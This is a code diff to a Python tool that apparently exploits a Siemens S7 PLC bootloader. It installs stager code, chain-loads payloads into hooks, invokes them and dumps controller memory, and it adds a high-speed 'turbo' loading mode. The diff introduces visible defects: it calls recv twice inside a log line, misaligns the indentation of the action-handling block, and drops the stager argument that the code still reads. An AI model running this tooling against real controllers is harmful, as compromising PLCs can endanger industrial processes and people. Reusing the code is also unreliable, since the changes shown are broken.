@@ -249,13 +249,13 @@ class SiemensS7Client:
         return True
 
     def handle_connection(self, args):
-        greeting = self.r.recv(5)
-        log.success("[+] Got special access greeting: {} [{}]".format(greeting.encode('hex'), greeting.encode('hex')))
+        log.success("[+] Got special access greeting: {} [{}]".format(self.r.recv(5).encode('hex'), self.r.recv(5).encode('hex')))
 
         version = self.get_version()
         bootloaderversion = version[2:3] + ".".join([str(ord(c)) for c in version[3:-2]])
         log.success("[+] Got PLC bootLoader version: " + bootloaderversion)
 
+        # Always install the normal stager first
         stager_code = args.stager.read()
         start = time.time()
         stager_addhook_ind = self.install_stager(stager_code)
@@ -263,18 +263,37 @@ class SiemensS7Client:
 
         payload = args.payload.read() if hasattr(args, 'payload') and args.payload else None
 
-        if args.action == ACTION_DUMP_TURBO:
+        # If turbo mode is enabled, chain-load the turbo stager and then the final payload
+        if args.turbo_stager:
+            log.info("--- TURBO MODE ENABLED ---")
+            turbo_stager_code = args.turbo_stager.read()
+
+            # 1. Install turbo_stager using the normal stager
+            log.info("Installing turbo_stager...")
+            turbo_stager_hook = self.install_addhook_via_stager(self.next_payload_location, turbo_stager_code, stager_addhook_ind, add_hook_no=DEFAULT_SECOND_ADD_HOOK_IND)
+
+            # 2. Invoke turbo_stager (non-blocking) to start handshake
+            self.invoke_add_hook(turbo_stager_hook, await_response=False)
+
+            # 3. Perform handshake and switch baud rate
             if not self.switch_to_turbo_mode(): return
+
+            # 4. Load the final payload (e.g., dump_mem) at high speed
             if not self.load_payload_turbo(payload, self.next_payload_location): return
-            log.info("Dumping memory...")
-            contents = self.payload_dump_mem(args.address, args.length, DEFAULT_SECOND_ADD_HOOK_IND)
+
+            # The final payload is now installed at the *same* hook index as the turbo_stager was, because the turbo_stager overwrites its own hook entry.
+            second_addhook_ind = turbo_stager_hook
+
+        # If not turbo mode, just load the payload normally
         else:
             if payload is not None:
                 start = time.time()
                 second_addhook_ind = self.install_addhook_via_stager(self.next_payload_location, payload, stager_addhook_ind)
                 log.info("Installing the additional hook took {} seconds".format(time.time() - start))
 
-            if args.action == ACTION_INVOKE_HOOK:
+        # --- Execute final action ---
+        # This part is now common for both turbo and normal mode
+        if args.action == ACTION_INVOKE_HOOK:
                 answ = self.invoke_add_hook(second_addhook_ind, args.args)
                 log.info("Got answer: {}".format(answ))
             elif args.action == ACTION_DUMP:
@@ -342,12 +361,13 @@ def main():
 
     # Arguments for dump
     for p in [parser_dump, parser_dump_turbo]:
-        stager_default = TURBO_STAGER_PL_FILENAME if p.prog.endswith(ACTION_DUMP_TURBO) else STAGER_PL_FILENAME
-        p.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('r'), default=stager_default)
         p.add_argument('-p', '--payload', type=argparse.FileType('rb'), default=DUMPMEM_PL_FILENAME)
         p.add_argument('-a', '--address', type=lambda x: int(x, 0), required=True)
         p.add_argument('-l', '--length', type=lambda x: int(x, 0), required=True)
         p.add_argument('-o', '--out-file', dest='outfile', default=None)
+
+    # Specific stager for turbo mode, but available for all commands
+    parser.add_argument('--turbo-stager', type=argparse.FileType('rb'), default=None, help='Specify the turbo stager to enable high-speed mode for any command.')
 
     # Arguments for test
     parser_test.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('r'), default=STAGER_PL_FILENAME)
